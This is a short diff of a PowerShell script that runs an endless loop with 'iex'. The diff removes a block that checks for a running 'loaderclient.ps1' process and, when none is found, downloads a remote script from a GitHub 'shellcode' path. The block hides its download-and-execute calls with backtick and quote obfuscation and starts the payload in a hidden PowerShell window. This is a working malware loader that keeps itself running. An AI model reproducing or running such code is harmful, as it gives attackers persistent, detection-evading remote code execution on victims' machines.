@@ -8,21 +8,5 @@ while ($true) {
     
     iex $a
     
-    $processes = Get-CimInstance Win32_Process | Where-Object { $_.Name -like "powershell*" }
-    $found = $false
-
-    foreach ($proc in $processes) {
-        if ($proc.CommandLine -match "loaderclient.ps1") {
-            $found = $true
-            break
-        }
-    }
-
-    if (-not $found) {
-        $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
-        $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-        Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
-    }
-    
     Start-Sleep -Seconds 3 # Tạm dừng 1 giây để tránh quá tải
 }
